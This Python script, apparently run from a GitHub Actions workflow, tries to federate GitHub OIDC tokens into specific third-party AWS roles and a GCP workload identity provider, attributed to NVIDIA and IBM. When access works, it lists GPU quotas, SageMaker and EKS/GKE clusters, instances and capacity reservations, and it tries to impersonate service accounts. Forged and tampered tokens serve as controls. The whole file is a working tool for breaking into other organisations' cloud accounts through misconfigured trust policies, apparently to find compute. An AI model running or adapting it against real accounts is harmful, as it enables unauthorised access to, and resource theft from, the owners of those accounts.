#!/usr/bin/env python3
"""Intent 113476: GitHub-OIDC federation test of the 3 untested leads + controls.

Leads (deduped against the 7 task-545 trust-tested GATEs, facts 113382/113403):
  AWS arn:aws:iam::786169356362:role/odin/kumo-external-access-role   (NVIDIA kumo-engine)
  AWS arn:aws:iam::678256850452:role/ocp-sts-role                     (IBM cloud-pak-deployer)
  GCP projects/328033609117/locations/global/workloadIdentityPools/
      multi-storage-client-beta/providers/multi-storage-client-beta   (NVIDIA multi-storage-client)

Controls:
  * positive AWS role / GCP provider known to accept pool repo tokens (prior facts)
  * bogus role ARN / bogus provider
  * tampered (last-char corrupted) GitHub OIDC JWT
  * self-signed bogus JWT (alg RS256, random key)
  * different-subject run (separate branch) and different-audience mint

Runs inside picxbed/ci-utils GitHub Actions (workflow_dispatch / push).
"""
import json, os, sys, base64, hmac, hashlib, datetime, urllib.request, urllib.error, urllib.parse

TAG = 'c211-i113476'

def out(tag, obj):
    print('RESULT %s %s' % (tag, json.dumps(obj, sort_keys=True, default=str)), flush=True)

def mint(aud):
    u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
    t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
    if not u or not t:
        raise RuntimeError('oidc env missing')
    url = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + t})
    return json.loads(urllib.request.urlopen(req, timeout=30).read())['value']

def claims(tok):
    p = tok.split('.')[1]; p += '=' * (-len(p) % 4)
    d = json.loads(base64.urlsafe_b64decode(p))
    return {k: d.get(k) for k in ('iss', 'sub', 'aud', 'repository', 'repository_id', 'ref',
                                  'event_name', 'environment', 'workflow_ref', 'job_workflow_ref')}

def corrupt(tok):
    last = tok[-1]
    return tok[:-1] + ('A' if last != 'A' else 'B')

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def bogus_jwt():
    """Self-signed JWT with GitHub-shaped claims but a random RSA key."""
    header = {'alg': 'RS256', 'typ': 'JWT', 'kid': 'c211-i113476-bogus'}
    now = int(datetime.datetime.utcnow().timestamp())
    payload = {'iss': 'https://token.actions.githubusercontent.com',
               'sub': 'repo:picxbed/ci-utils:ref:refs/heads/c211-i113476',
               'aud': 'sts.amazonaws.com', 'repository': 'picxbed/ci-utils',
               'iat': now, 'nbf': now, 'exp': now + 600}
    signing_input = b64u(json.dumps(header).encode()) + '.' + b64u(json.dumps(payload).encode())
    fake_sig = b64u(hashlib.sha256(os.urandom(32) + signing_input.encode()).digest())
    return signing_input + '.' + fake_sig

def http(method, url, data=None, headers=None, timeout=60):
    h = dict(headers or {})
    if isinstance(data, str):
        data = data.encode()
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, str(e)[:300]

def xml_fields(txt):
    import xml.etree.ElementTree as ET
    try:
        root = ET.fromstring(txt)
    except Exception:
        return {'raw': txt[:300]}
    res = {}
    for el in root.iter():
        name = el.tag.split('}')[-1]
        if name in ('AccessKeyId', 'SecretAccessKey', 'SessionToken', 'Expiration', 'Code',
                    'Message', 'RoleArn', 'AssumedRoleId', 'Account', 'Arn', 'UserId'):
            res[name] = el.text
    return res

def aws_assume(role, tok, tag=''):
    body = urllib.parse.urlencode({'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
                                   'RoleArn': role, 'RoleSessionName': TAG,
                                   'WebIdentityToken': tok, 'DurationSeconds': '3600'}).encode()
    st, txt = http('POST', 'https://sts.amazonaws.com/', body,
                   {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': TAG})
    f = xml_fields(txt)
    return st, f, txt

def _sign(key, msg):
    return hmac.new(key, msg.encode(), hashlib.sha256).digest()

def sigv4(method, host, path, region, service, ak, sk, stk, body='',
          ctype='application/x-www-form-urlencoded', extra=None):
    t = datetime.datetime.utcnow()
    amzdate = t.strftime('%Y%m%dT%H%M%SZ'); datestamp = t.strftime('%Y%m%d')
    headers = {'host': host, 'x-amz-date': amzdate, 'x-amz-security-token': stk}
    if body:
        headers['content-type'] = ctype
    if extra:
        for k, v in extra.items():
            headers[k.lower()] = v
    signed = sorted(headers)
    canon_headers = ''.join('%s:%s\n' % (k, headers[k].strip()) for k in signed)
    payload_hash = hashlib.sha256(body.encode()).hexdigest()
    canonical_request = '\n'.join([method, path, '', canon_headers, ';'.join(signed), payload_hash])
    scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
    sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope,
                     hashlib.sha256(canonical_request.encode()).hexdigest()])
    k = ('AWS4' + sk).encode()
    for m in (datestamp, region, service, 'aws4_request'):
        k = _sign(k, m)
    sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
    auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (
        ak, scope, ';'.join(signed), sig)
    return {'Authorization': auth, 'X-Amz-Date': amzdate, 'X-Amz-Security-Token': stk,
            'Content-Type': ctype, 'Host': host}

def aws_api(creds, region, service, body, target=None, ctype='application/x-amz-json-1.1'):
    ak, sk, stk = creds['AccessKeyId'], creds['SecretAccessKey'], creds['SessionToken']
    if service == 'sts':
        host = 'sts.amazonaws.com'; path = '/'
    elif service == 'ec2':
        host = 'ec2.%s.amazonaws.com' % region; path = '/'
    elif service == 'sagemaker':
        host = 'api.sagemaker.%s.amazonaws.com' % region; path = '/'
    elif service == 'servicequotas':
        host = 'servicequotas.%s.amazonaws.com' % region; path = '/'
    elif service == 'eks':
        host = 'eks.%s.amazonaws.com' % region; path = '/'
    else:
        host = '%s.%s.amazonaws.com' % (service, region); path = '/'
    extra = {}
    if target:
        extra['x-amz-target'] = target
    hdrs = sigv4('POST', host, path, region, service, ak, sk, stk,
                 body=body, ctype=ctype, extra=extra)
    st, txt = http('POST', 'https://' + host + path, body, hdrs)
    return st, txt

def trim(txt, n=900):
    return txt[:n] if isinstance(txt, str) else txt

REGIONS = ['us-east-1', 'us-west-2', 'us-east-2', 'eu-west-1', 'ap-northeast-1', 'ap-south-1']

def enumerate_aws(creds, tag):
    try:
        st, txt = aws_api(creds, 'us-east-1', 'sts', 'Action=GetCallerIdentity&Version=2011-06-15')
        out(tag + '-CALLER', {'status': st, 'body': trim(txt, 500)})
    except Exception as e:
        out(tag + '-CALLER', {'error': str(e)[:200]})
    for region in REGIONS:
        try:
            st, txt = aws_api(creds, region, 'servicequotas',
                              json.dumps({'ServiceCode': 'sagemaker', 'MaxResults': 100}),
                              target='ServiceQuotasV20190624.ListServiceQuotas')
            vals = []
            try:
                for q in json.loads(txt).get('Quotas', []):
                    nm = q.get('QuotaName') or ''
                    if 'ml.' in nm or 'training job' in nm or 'endpoint' in nm:
                        vals.append([nm, q.get('Value')])
            except Exception:
                pass
            out(tag + '-SMQUOTA-' + region, {'status': st, 'gpu_quotas': vals[:40],
                                             'body': trim(txt, 200) if st != 200 else ''})
        except Exception as e:
            out(tag + '-SMQUOTA-' + region, {'error': str(e)[:200]})
    for region in ('us-east-1', 'us-west-2', 'us-east-2'):
        for target, body in (('SageMaker.ListClusters', '{}'),
                             ('SageMaker.ListEndpoints', '{}')):
            try:
                st, txt = aws_api(creds, region, 'sagemaker', body, target=target)
                out('%s-%s-%s' % (tag, target.split('.')[-1], region),
                    {'status': st, 'body': trim(txt, 700)})
            except Exception as e:
                out('%s-%s-%s' % (tag, target.split('.')[-1], region), {'error': str(e)[:200]})
    for region in REGIONS:
        try:
            st, txt = aws_api(creds, region, 'ec2', 'Action=DescribeCapacityReservations&Version=2016-11-15')
            out(tag + '-CAPRES-' + region, {'status': st, 'body': trim(txt, 600)})
        except Exception as e:
            out(tag + '-CAPRES-' + region, {'error': str(e)[:200]})
    for region in REGIONS:
        try:
            st, txt = aws_api(creds, region, 'eks', '{}', target='EKS.ListClusters')
            out(tag + '-EKSLIST-' + region, {'status': st, 'body': trim(txt, 500)})
        except Exception as e:
            out(tag + '-EKSLIST-' + region, {'error': str(e)[:200]})

def gcp_sts(provider, tok):
    aud = '//iam.googleapis.com/' + provider
    data = urllib.parse.urlencode({
        'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
        'audience': aud,
        'scope': 'https://www.googleapis.com/auth/cloud-platform',
        'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
        'subject_token_type': 'urn:ietf:params:oauth:token-type:jwt',
        'subject_token': tok}).encode()
    return http('POST', 'https://sts.googleapis.com/v1/token', data,
                {'Content-Type': 'application/x-www-form-urlencoded'})

def gcp_get(at, url, tag):
    st, txt = http('GET', url, headers={'Authorization': 'Bearer ' + at})
    out(tag, {'status': st, 'body': trim(txt, 900)})
    return st, txt

def enumerate_gcp(at, project, tag):
    gcp_get(at, 'https://cloudresourcemanager.googleapis.com/v1/projects/' + project, tag + '-PROJECT')
    gcp_get(at, 'https://serviceusage.googleapis.com/v1/projects/%s/services?filter=state:ENABLED&pageSize=30' % project,
            tag + '-SERVICES')
    gcp_get(at, 'https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances?maxResults=50' % project,
            tag + '-INSTANCES')
    gcp_get(at, 'https://compute.googleapis.com/compute/v1/projects/%s/regions/us-central1/quotas' % project,
            tag + '-QUOTAS')
    gcp_get(at, 'https://aiplatform.googleapis.com/v1/projects/%s/locations?pageSize=20' % project,
            tag + '-VERTEX-LOCS')
    gcp_get(at, 'https://container.googleapis.com/v1/projects/%s/locations/-/clusters' % project,
            tag + '-GKE')
    # service-account impersonation candidates (bounded)
    for sa in ('multi-storage-client-beta@%s.iam.gserviceaccount.com' % project,
               'multi-storage-client@%s.iam.gserviceaccount.com' % project,
               'github-actions@%s.iam.gserviceaccount.com' % project):
        body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                           'lifetime': '900s'})
        st, txt = http('POST',
                       'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % sa,
                       body, {'Content-Type': 'application/json',
                              'Authorization': 'Bearer ' + at})
        out(tag + '-IMPERSONATE-' + sa.split('@')[0], {'status': st, 'body': trim(txt, 400)})

AWS_TARGETS = [
    ('KUMO-ODIN', 'arn:aws:iam::786169356362:role/odin/kumo-external-access-role'),
    ('IBM-OCP', 'arn:aws:iam::678256850452:role/ocp-sts-role'),
]
AWS_POS_CONTROL = ('POS-CONTROL', 'arn:aws:iam::420032683002:role/openvdb-fvdb-github-actions-role')
AWS_BAD_ROLE = 'arn:aws:iam::420032683002:role/c211-i113476-no-such-role'
GCP_PROVIDER = ('projects/328033609117/locations/global/workloadIdentityPools/'
                'multi-storage-client-beta/providers/multi-storage-client-beta')
GCP_POS_CONTROL = ('projects/531508670106/locations/global/workloadIdentityPools/'
                   'github-identity-pool/providers/github-id-provider')

def main():
    out('ENV', {'repo': os.environ.get('GITHUB_REPOSITORY'),
                'ref': os.environ.get('GITHUB_REF'),
                'sha': os.environ.get('GITHUB_SHA'),
                'run_id': os.environ.get('GITHUB_RUN_ID'),
                'event': os.environ.get('GITHUB_EVENT_NAME'),
                'actor': os.environ.get('GITHUB_ACTOR')})
    aws_tok = mint('sts.amazonaws.com')
    out('AWS-CLAIMS', claims(aws_tok))
    ok = {}
    for name, role in AWS_TARGETS + [AWS_POS_CONTROL]:
        st, f, raw = aws_assume(role, aws_tok)
        out('AWS-ASSUME-' + name, {'status': st, 'code': f.get('Code'),
                                   'message': (f.get('Message') or '')[:300],
                                   'assumed': bool(f.get('AccessKeyId')), 'role': role})
        if f.get('AccessKeyId'):
            ok[name] = f
    # controls
    st, f, raw = aws_assume(AWS_TARGETS[0][1], corrupt(aws_tok))
    out('AWS-CTL-TAMPERED', {'status': st, 'code': f.get('Code'),
                             'message': (f.get('Message') or '')[:300],
                             'assumed': bool(f.get('AccessKeyId'))})
    st, f, raw = aws_assume(AWS_TARGETS[0][1], bogus_jwt())
    out('AWS-CTL-BOGUSJWT', {'status': st, 'code': f.get('Code'),
                             'message': (f.get('Message') or '')[:300],
                             'assumed': bool(f.get('AccessKeyId'))})
    st, f, raw = aws_assume(AWS_BAD_ROLE, aws_tok)
    out('AWS-CTL-BADROLE', {'status': st, 'code': f.get('Code'),
                            'message': (f.get('Message') or '')[:300],
                            'assumed': bool(f.get('AccessKeyId'))})
    # different-audience token (not mintable for sts.amazonaws.com by the trust)
    waud = mint('https://c211-i113476.invalid')
    out('AWS-WRONG-AUD-CLAIMS', claims(waud))
    st, f, raw = aws_assume(AWS_TARGETS[0][1], waud)
    out('AWS-CTL-WRONGAUD', {'status': st, 'code': f.get('Code'),
                             'message': (f.get('Message') or '')[:300],
                             'assumed': bool(f.get('AccessKeyId'))})
    for name, f in ok.items():
        enumerate_aws(f, 'AWS-' + name)
    # GCP
    gtok = mint('//iam.googleapis.com/' + GCP_PROVIDER)
    out('GCP-CLAIMS', claims(gtok))
    st, txt = gcp_sts(GCP_PROVIDER, gtok)
    out('GCP-STS-TARGET', {'status': st, 'body': trim(txt, 700)})
    if st == 200:
        try:
            at = json.loads(txt).get('access_token', '')
            enumerate_gcp(at, '328033609117', 'GCP-TARGET')
        except Exception as e:
            out('GCP-TARGET-ENUM', {'error': str(e)[:200]})
    st, txt = gcp_sts(GCP_PROVIDER, corrupt(gtok))
    out('GCP-CTL-TAMPERED', {'status': st, 'body': trim(txt, 400)})
    st, txt = gcp_sts(GCP_PROVIDER, bogus_jwt())
    out('GCP-CTL-BOGUSJWT', {'status': st, 'body': trim(txt, 400)})
    bad_provider = GCP_PROVIDER[:-1] + ('x' if GCP_PROVIDER[-1] != 'x' else 'y')
    btok = mint('//iam.googleapis.com/' + bad_provider)
    st, txt = gcp_sts(bad_provider, btok)
    out('GCP-CTL-BADPROVIDER', {'status': st, 'body': trim(txt, 400)})
    wrong_aud = mint('//iam.googleapis.com/projects/328033609117')
    out('GCP-WRONG-AUD-CLAIMS', claims(wrong_aud))
    st, txt = gcp_sts(GCP_PROVIDER, wrong_aud)
    out('GCP-CTL-WRONGAUD', {'status': st, 'body': trim(txt, 400)})
    ptok = mint('//iam.googleapis.com/' + GCP_POS_CONTROL)
    st, txt = gcp_sts(GCP_POS_CONTROL, ptok)
    out('GCP-CTL-POSITIVE', {'status': st, 'body': trim(txt, 500)})
    out('DONE', {'ok': True})

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        out('FATAL', {'error': str(e)[:400]})
        raise
